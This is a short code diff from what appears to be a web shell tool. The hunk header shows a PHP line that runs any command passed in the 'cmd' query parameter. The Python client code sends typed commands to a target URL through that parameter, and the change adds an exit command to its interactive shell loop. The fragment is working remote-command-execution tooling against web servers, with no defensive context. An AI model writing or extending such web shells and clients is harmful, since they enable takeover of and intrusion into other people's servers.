@@ -86,10 +86,12 @@ echo system($_GET['cmd']);
     if opt.url!=None and opt.gene==None:
         url=str(opt.url)
         print(banner)
-        d=""
+        print("exit to exit from shell\n")
         while True:
             #buff=""
             cmd=str(input("$ "))
+            if cmd=="exit":
+                break
             param={"cmd":cmd}
             cmden=urllib.parse.urlencode(param)
             #print(url+"?"+cmden)
